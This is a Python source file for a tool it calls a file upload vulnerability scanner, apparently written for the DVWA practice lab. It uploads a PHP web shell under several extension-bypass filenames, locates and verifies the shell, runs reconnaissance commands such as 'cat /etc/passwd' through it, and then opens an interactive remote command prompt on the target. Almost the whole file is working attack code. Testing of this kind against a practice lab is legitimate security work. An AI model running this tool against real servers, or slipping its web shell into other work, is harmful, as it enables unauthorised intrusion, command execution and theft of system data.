import requests
from colorama import Fore, init
import io
import re

init(autoreset=True)

class FileUploadScanner:
    SHELL_PAYLOAD = "<?php echo shell_exec($_GET['cmd']); ?>"

    BYPASS_FILENAMES = [
        "shell.php",
        "shell.php5",
        "shell.phtml",
        "shell.pHp",
        "shell.php.jpg",
    ]

    def __init__(self, session, base_url="http://127.0.0.1", config=None,
                 file_field="uploaded", upload_dir_hint="hackable/uploads"):
        self.session = session
        self.base_url = base_url.rstrip("/")
        self.findings = []
        self.shell_url = None
        # file_field: the form's file-input name (DVWA uses "uploaded";
        # other targets commonly use "file", "avatar", "attachment", etc.)
        self.file_field = file_field
        # upload_dir_hint: a known/likely path where uploads are served
        # from, used as a fallback when the response doesn't explicitly
        # say where the file landed
        self.upload_dir_hint = upload_dir_hint.strip("/")

    def attempt_upload(self, upload_url, filename):
        print(f"{Fore.BLUE}[*] Attempting upload: {filename}")
        files = {
            self.file_field: (
                filename,
                io.BytesIO(self.SHELL_PAYLOAD.encode()),
                "application/x-php"
            )
        }
        data = {"Upload": "Upload"}
        try:
            resp = self.session.post(upload_url, files=files, data=data, timeout=10)
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Upload request failed: {e}")
            return None
        return resp

    def check_upload_success(self, resp, filename):
        if not resp:
            return None

        body = resp.text

        # 1. Best signal: the response contains a path ending in our
        # exact filename (or a renamed variant) — this works regardless
        # of what directory structure the target uses
        path_match = re.search(
            r'([\w./-]*' + re.escape(filename.rsplit(".", 1)[0]) + r'[\w.]*\.(?:php\w*|phtml|pHp))',
            body, re.IGNORECASE
        )
        if path_match:
            found_path = path_match.group(1).lstrip("./")
            shell_url = f"{self.base_url}/{found_path}"
            print(f"{Fore.GREEN}[+] Upload succeeded: {shell_url}")
            return shell_url

        # 2. Generic success keywords, combined with the configured
        # upload_dir_hint as the best guess for where the file landed
        success_patterns = [
            r'succesfully uploaded',
            r'successfully uploaded',
            r'upload(ed)? (was )?success',
            r'file (was )?saved',
            r'file (was )?stored',
        ]
        for pattern in success_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                shell_url = f"{self.base_url}/{self.upload_dir_hint}/{filename}"
                print(f"{Fore.GREEN}[+] Upload appears successful (keyword match) — "
                      f"guessing path: {shell_url}")
                print(f"{Fore.YELLOW}    (path is a guess based on upload_dir_hint — "
                      f"verify manually if shell doesn't respond)")
                return shell_url

        # 3. Known rejection message (DVWA-specific, kept as a fast
        # negative-path signal, not required for success detection)
        if "Your image was not uploaded" in body:
            print(f"{Fore.YELLOW}[!] Upload rejected for: {filename}")

        return None

    def verify_shell(self, shell_url):
        print(f"{Fore.BLUE}[*] Verifying shell at {shell_url}...")
        try:
            resp = self.session.get(shell_url, params={"cmd": "echo SHELL_ALIVE_9f3a"}, timeout=10)
        except requests.exceptions.RequestException:
            return False
        if "SHELL_ALIVE_9f3a" in resp.text:
            print(f"{Fore.GREEN}[+] Shell is live and executing commands")
            return True
        print(f"{Fore.YELLOW}[?] Shell uploaded but not executing")
        return False

    def run_command(self, shell_url, cmd):
        try:
            resp = self.session.get(shell_url, params={"cmd": cmd}, timeout=10)
            return resp.text.strip()
        except requests.exceptions.RequestException:
            return None

    def exploit_shell(self, shell_url):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   WEB SHELL EXPLOITATION -> {shell_url}")
        print(f"{Fore.CYAN}{'='*55}\n")

        auto_commands = {
            "whoami":               "web server process user",
            "id":                   "full user/group context",
            "hostname":             "target hostname",
            "uname -a":             "OS and kernel version",
            "pwd":                  "current working directory",
            "ls -la /var/www/html": "web root contents",
            "cat /etc/passwd":      "local system users"
        }

        results = {}

        for cmd, description in auto_commands.items():
            output = self.run_command(shell_url, cmd)
            if output:
                print(f"{Fore.RED}[+] {cmd:<30} -> {description}")
                for line in output.split('\n')[:5]:
                    if line.strip():
                        print(f"{Fore.YELLOW}    {line.strip()}")
                results[cmd] = output
            else:
                print(f"{Fore.YELLOW}[?] {cmd:<30} -> no output")

        # ── Interactive prompt ───────────────────────────────
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   INTERACTIVE WEB SHELL")
        print(f"{Fore.CYAN}   Shell: {shell_url}")
        print(f"{Fore.CYAN}   Type OS commands. 'exit' to continue scan.")
        print(f"{Fore.CYAN}{'='*55}\n")

        while True:
            try:
                cmd = input(f"{Fore.RED}webshell{Fore.WHITE}@{Fore.YELLOW}target{Fore.WHITE}> ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not cmd:
                continue

            if cmd.lower() in ("exit", "quit", "q"):
                print(f"{Fore.CYAN}[*] Exiting interactive shell...")
                break

            output = self.run_command(shell_url, cmd)

            if output:
                print(f"{Fore.WHITE}{output}")
                results[f"[interactive] {cmd}"] = output
            else:
                print(f"{Fore.YELLOW}[?] No output returned")

        return results

    def scan(self, upload_url="http://127.0.0.1/vulnerabilities/upload/"):
        print(f"\n{Fore.CYAN}{'='*55}")
        print(f"{Fore.CYAN}   FILE UPLOAD VULNERABILITY SCAN")
        print(f"{Fore.CYAN}{'='*55}\n")

        shell_url = None

        for filename in self.BYPASS_FILENAMES:
            resp = self.attempt_upload(upload_url, filename)
            shell_url = self.check_upload_success(resp, filename)
            if shell_url:
                self.shell_url = shell_url
                break

        if not shell_url:
            print(f"{Fore.RED}[-] All upload attempts blocked")
            return None

        if not self.verify_shell(shell_url):
            self.findings.append({
                "type": "FILE_UPLOAD",
                "severity": "HIGH",
                "url": upload_url,
                "shell_url": shell_url,
                "note": "PHP file uploaded but execution blocked",
                "commands_executed": {}
            })
            return self.findings

        exploitation_results = self.exploit_shell(shell_url)

        self.findings.append({
            "type": "FILE_UPLOAD",
            "severity": "CRITICAL",
            "url": upload_url,
            "shell_url": shell_url,
            "shell_payload": self.SHELL_PAYLOAD,
            "commands_executed": exploitation_results
        })

        print(f"\n{Fore.CYAN}[*] File upload scan complete: "
              f"{len(exploitation_results)} commands executed through shell")
        return self.findings
